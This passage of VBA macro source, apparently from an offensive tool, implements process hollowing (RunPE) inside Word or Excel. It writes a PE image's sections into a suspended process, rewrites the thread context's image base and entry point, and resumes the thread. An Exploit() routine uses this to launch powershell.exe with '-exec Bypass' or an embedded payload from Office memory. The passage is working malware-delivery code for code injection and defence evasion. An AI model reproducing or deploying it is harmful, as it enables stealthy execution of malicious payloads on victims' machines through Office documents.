        Call RtlMoveMemory(ptrSectionHeader, VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
        
        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
        Dim lNewAddress As LongPtr: lNewAddress = lProcessImageBase + structSectionHeader.VirtualAddress
        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
        
        Debug.Print ("[*] Writing section '" + strSectionName + "'")
        Debug.Print ("[*] |__ Image base: 0x" + Hex(lProcessImageBase))
        Debug.Print ("[*] |__ Section virtual address: 0x" + Hex(structSectionHeader.VirtualAddress))
        Debug.Print ("[*] |__ New address (base+virt.): 0x" + Hex(lNewAddress))
        Debug.Print ("[*] |__ Raw data address (buffer): 0x" + Hex(VarPtr(baImage(0 + structSectionHeader.PointerToRawData))))
        Debug.Print ("[*] |__ Section size:" + Str(lSize))
        
        lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, lNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize, 0&)
        If lWriteProcessMemory = 0 Then
            Debug.Print ("[-] Error: 'WriteProcessMemory'")
            Call TerminateProcess(structProcessInformation.hProcess, 0)
            Exit Sub
        Else
            Debug.Print ("[+] Wrote section '" + strSectionName + "' at address 0x" + Hex(lNewAddress) + " (size:" + Str(lSize) + ")")
        End If
    Next iCount
    
    ' Referencing new image base address in thread context
    Debug.Print ("[*] Modifying context to point to new image base")
    #If Win64 Then
        Dim lAddrLocation As LongPtr: lAddrLocation = structContext.Rdx + 16
    #Else
        Dim lAddrLocation As LongPtr: lAddrLocation = structContext.Ebx + 8
    #End If
    Debug.Print ("[*] |__ Where to write new image base address: 0x" + Hex(lAddrLocation))
    Debug.Print ("[*] |__ Image base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
    
    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, lAddrLocation, VarPtr(structNTHeaders.OptionalHeader.ImageBase), SIZEOF_ADDRESS, 0&)
    If lWriteProcessMemory = 0 Then
        Debug.Print ("[-] Error: 'WriteProcessMemory'")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        Debug.Print ("[+] Wrote image base address 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase) + " at address 0x" + Hex(lAddrLocation))
    End If

    ' Set entry point
    Debug.Print ("[*] Applying new context")
    Dim lEntryPoint As LongPtr: lEntryPoint = lProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
    #If Win64 Then
        structContext.Rcx = lEntryPoint
    #Else
        structContext.Eax = lEntryPoint
    #End If
    Debug.Print ("[*] |__ Set new entry point: 0x" + Hex(lEntryPoint))
    
    ' Set the context to the new thread
    Dim lSetThreadContext As Long
    lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
    If lSetThreadContext = 0 Then
        Debug.Print ("[-] |__ Couldn't apply context to the new thread")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    Else
        Debug.Print ("[+] |__ Applied context to the new thread")
    End If
    
    ' Resume thread
    ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
    Debug.Print ("[*] Resuming suspended process")
    Dim lResumeThread As Long
    lResumeThread = ResumeThread(structProcessInformation.hThread)
    If lResumeThread = 1 Then
        Debug.Print ("[+] |__ RunPE complete, successfully resumed thread")
    Else
        Debug.Print ("[-] |__ Resume thread failed")
        Call TerminateProcess(structProcessInformation.hProcess, 0)
        Exit Sub
    End If
End Sub

' --------------------------------------------------------------------------------
' Method:    Exploit
' Desc:      Calls FileToByteArray to get the content of a PE file as a Byte
'               array and calls the RunPE procedure to execute it from the memory
'               of Word / Excel
' Arguments: N/A
' Returns:   N/A
' --------------------------------------------------------------------------------
Public Sub Exploit()

    Debug.Print ("================================================================================")
    
    Dim strSrcFile As String
    Dim strArguments As String
    Dim strPE As String
    Dim baFileContent() As Byte
    
    'strSrcFile = "C:\Windows\System32\cmd.exe"
    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    
    'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
    'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    
    strArguments = "-exec Bypass"
    
    strPE = PE()
    If strPE = "" Then
        If Dir(strSrcFile) = "" Then
            Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
            Exit Sub
        Else
            Debug.Print ("[+] Source file: '" + strSrcFile + "'")
            Debug.Print ("[*] |__ Command line: " + strSrcFile + " " + strArguments)
        End If
        baFileContent = FileToByteArray(strSrcFile)
        Call RunPE(baFileContent, strArguments)
    Else
        Debug.Print ("[+] Source file: embedded PE")
        baFileContent = StringToByteArray(strPE)
        Call RunPE(baFileContent, strArguments)
    End If

End Sub


